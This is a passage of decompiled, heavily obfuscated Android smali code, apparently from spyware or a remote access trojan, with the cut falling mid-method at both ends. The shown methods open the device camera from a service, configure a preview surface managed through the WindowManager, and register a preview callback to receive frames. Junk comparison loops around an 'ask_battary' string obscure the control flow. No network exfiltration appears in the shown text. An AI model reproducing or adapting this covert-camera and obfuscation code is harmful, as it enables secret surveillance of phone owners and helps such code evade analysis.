    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v1, :cond_1

    .line 1028
    :try_start_1
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->wm:Landroid/view/WindowManager;

    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

    invoke-interface {v1, v2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 1031
    :catch_0
    :cond_1
    :try_start_2
    iput-boolean v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->usd:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_4

    :catch_1
    const/4 v1, 0x1

    .line 1033
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1034
    :goto_0
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    const-string v4, "ask_battary"

    const-string v5, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v3, :cond_3

    .line 1036
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1037
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 1039
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1040
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_0

    .line 1046
    :cond_2
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_0

    .line 1049
    :cond_3
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_5

    .line 1051
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1052
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 1054
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1055
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1

    .line 1061
    :cond_4
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1

    .line 1064
    :cond_5
    :goto_2
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_7

    .line 1066
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1067
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 1069
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1070
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_2

    .line 1076
    :cond_6
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_2

    .line 1079
    :cond_7
    :goto_3
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_9

    .line 1081
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1082
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    .line 1084
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 1085
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_3

    .line 1091
    :cond_8
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_3

    .line 1096
    :cond_9
    :goto_4
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1097
    invoke-virtual {p0, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    .line 751
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    .line 752
    new-instance p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12$2;

    invoke-direct {p2, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12$2;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 13

    const-string v0, "continuous-video"

    const-string v1, "ask_battary"

    const-string v2, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    .line 575
    iget-object v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    const/4 v4, 0x0

    .line 586
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    .line 575
    aget-object v3, v3, v4

    const-string v6, ","

    invoke-virtual {v3, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v6, 0x1

    .line 578
    :try_start_0
    aget-object v7, v3, v4

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v7

    invoke-static {v7}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v7

    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_4

    .line 579
    :catch_0
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    .line 580
    :goto_0
    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_1

    .line 582
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 583
    sget-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 585
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v7, v5

    goto :goto_0

    .line 592
    :cond_0
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    goto :goto_0

    .line 595
    :cond_1
    :goto_1
    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_3

    .line 597
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 598
    sget-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 600
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v7, v5

    goto :goto_1

    .line 607
    :cond_2
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    goto :goto_1

    .line 610
    :cond_3
    :goto_2
    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_5

    .line 612
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 613
    sget-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 615
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v7, v5

    goto :goto_2

    .line 622
    :cond_4
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    goto :goto_2

    .line 625
    :cond_5
    :goto_3
    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_7

    .line 627
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 628
    sget-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_6

    .line 630
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v7, v5

    goto :goto_3

    .line 637
    :cond_6
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    goto :goto_3

    .line 641
    :cond_7
    :goto_4
    :try_start_1
    sget-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {v7}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v7

    const/4 v8, 0x0

    .line 643
    sget-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {v9}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v9

    invoke-virtual {v9}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v9

    if-eqz v9, :cond_9

    .line 644
    sget-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {v9}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v9

    .line 645
    invoke-virtual {v9}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v9

    .line 646
    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :cond_8
    :goto_5
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_9

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/hardware/Camera$Size;

    .line 647
    iget v11, v10, Landroid/hardware/Camera$Size;->width:I

    const/16 v12, 0x258

    if-le v11, v12, :cond_8

    iget v11, v10, Landroid/hardware/Camera$Size;->height:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    const/16 v12, 0x190

    if-le v11, v12, :cond_8

    move-object v8, v10

    goto :goto_5

    .line 654
    :cond_9
    :try_start_2
    array-length v9, v3

    if-le v9, v6, :cond_a

    .line 656
    aget-object v9, v3, v6

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v9

    iput v9, v8, Landroid/hardware/Camera$Size;->width:I

    const/4 v9, 0x2

    .line 657
    aget-object v9, v3, v9

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v9

    iput v9, v8, Landroid/hardware/Camera$Size;->height:I

    const/4 v9, 0x3

    .line 658
    aget-object v3, v3, v9

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    iput v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Qulty:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_6

    .line 662
    :catch_1
    :try_start_3
    iput v4, v8, Landroid/hardware/Camera$Size;->width:I

    .line 663
    iput v4, v8, Landroid/hardware/Camera$Size;->height:I

    .line 666
    :cond_a
    :goto_6
    iget v3, v8, Landroid/hardware/Camera$Size;->width:I

    if-eqz v3, :cond_b

    iget v3, v8, Landroid/hardware/Camera$Size;->height:I

    if-nez v3, :cond_c

    :cond_b
    const/16 v3, 0x280

    .line 668
    iput v3, v8, Landroid/hardware/Camera$Size;->width:I

    const/16 v3, 0x1e0

    .line 669
    iput v3, v8, Landroid/hardware/Camera$Size;->height:I

    .line 671
    :cond_c
    iget-object v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    const/4 v4, 0x4

    aget-object v3, v3, v4

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    if-ne v3, v6, :cond_d

    .line 672
    invoke-virtual {v7}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v3

    .line 673
    invoke-interface {v3, v0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_d

    .line 674
    invoke-virtual {v7, v0}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    .line 677
    :cond_d
    iget v0, v8, Landroid/hardware/Camera$Size;->width:I

    iget v3, v8, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v7, v0, v3}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v0, 0x11

    .line 678
    invoke-virtual {v7, v0}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    .line 679
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {v0, v7}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 680
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    .line 682
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_b

    .line 684
    :catch_2
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 685
    :goto_7
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_f

    .line 687
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 688
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_e

    .line 690
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object p1, v5

    goto :goto_7

    .line 697
    :cond_e
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_7

    .line 700
    :cond_f
    :goto_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_11

    .line 702
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 703
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_10

    .line 705
